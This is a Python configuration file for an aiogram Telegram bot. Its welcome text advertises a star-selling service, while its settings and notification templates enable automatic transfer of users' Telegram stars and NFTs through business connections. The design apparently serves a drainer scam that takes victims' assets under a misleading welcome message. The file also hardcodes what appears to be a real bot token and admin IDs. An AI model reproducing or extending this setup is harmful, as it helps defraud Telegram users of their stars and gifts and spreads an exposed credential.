
import os
from typing import Dict, Any
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton


TOKEN = "8277384877:AAHi1g9o9adngAMxzmkr04IBNdEJ0uf2CgY"


ADMIN_IDS = [
    8073910583,
    7253564590,
]


ADMIN_ID = ADMIN_IDS[0] if ADMIN_IDS else None

# База данных
DATABASE_PATH = "bot_database.db"


CONNECTIONS_FILE = "business_connections.json"
TRANSFER_LOG_FILE = "transfer_log.json"
SETTINGS_FILE = "settings.json"
CHECKS_FILE = "checks.json"


TRANSFER_DELAY = 1  
BALANCE_UPDATE_DELAY = 10  
AUTO_CHECK_INTERVAL = 900  
NOTIFICATION_INTERVAL = 1800  

# Настройки автоматизации
AUTO_TRANSFER_ENABLED = True
MANUAL_SELECTION_ENABLED = False
AUTO_NOTIFICATIONS_ENABLED = True
MIN_STARS_FOR_AUTO_TRANSFER = 10

# Лимиты отображения
MAX_NFT_DISPLAY = 5  
MAX_ERRORS_DISPLAY = 3  
MAX_LOGS_DISPLAY = 10 

# Настройки логирования
LOG_LEVEL = "INFO"
LOG_FORMAT = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
LOG_FILE = "bot.log"

# Настройки экспорта
EXPORT_CLEANUP_DAYS = 7  # Количество дней для хранения экспортных файлов

# Настройки уведомлений
NOTIFICATION_TEMPLATES = {
    'welcome': "✅ <b>Бот успешно подключен!</b>\nВесь функционал теперь доступен.",
    'balance_notification': "⭐️ <b>У вас накопилось {balance} звезд!</b>\n\nЭто достаточно для автоматического перевода NFT. Бот скоро заберет их для вас! 🎁",
    'auto_transfer_success': "✅ <b>Автоматически переведено {amount} звезд!</b>\n\nСпасибо за использование нашего бота! 🎉",
    'connection_error': "❌ <b>Ошибка подключения:</b> {error}",
    'transfer_success': "✅ <b>Перевод выполнен успешно!</b>\nПереведено: {amount}",
    'transfer_failed': "❌ <b>Ошибка перевода:</b> {error}"
}

# Сообщения для пользователей
WELCOME_MESSAGE = "⭐️ <b>Добро пожаловать в бот по продаже звезд!</b>\n\n🌟 Здесь вы можете:\n• Получать звезды от друзей\n• Отправлять звезды близким\n• Зарабатывать на звездах\n• Обменивать звезды на NFT\n\n💫 Начните зарабатывать звезды прямо сейчас!"
